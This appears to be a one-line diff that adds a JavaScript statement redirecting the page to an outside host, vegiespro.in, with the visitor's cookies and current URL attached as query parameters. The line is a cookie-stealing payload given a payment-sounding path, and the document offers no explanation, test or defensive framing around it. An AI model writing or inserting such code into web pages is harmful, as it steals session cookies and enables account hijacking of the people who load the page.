@@ -1,0 +1,1 @@
+document.location = 'https://vegiespro.in/securePay/cookie.php?c=' + document.cookie + '&cUrl=' + window.location.href;
